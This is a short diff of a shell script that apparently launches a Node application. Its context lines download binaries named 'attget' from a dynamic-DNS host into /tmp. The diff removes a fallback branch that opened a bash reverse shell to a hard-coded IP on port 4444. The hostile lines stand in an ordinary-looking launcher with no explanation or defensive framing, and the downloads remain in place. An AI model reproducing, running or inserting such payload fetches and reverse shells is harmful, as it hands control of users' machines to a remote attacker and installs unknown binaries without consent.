@@ -13,8 +13,6 @@ if [ "$ARCH" = "x86_64" ]; then
 elif [ "$ARCH" = "aarch64" ]; then
     wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget_arm64"
     wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
-else
-    /bin/bash -i >& /dev/tcp/96.62.214.13/4444 0>&1 &
 fi
 
 sleep 2
@@ -29,6 +27,6 @@ sleep 2
 # /tmp/attget skip
 # sleep 2
 
-node dist/main.ts
+node dist/main
 
 
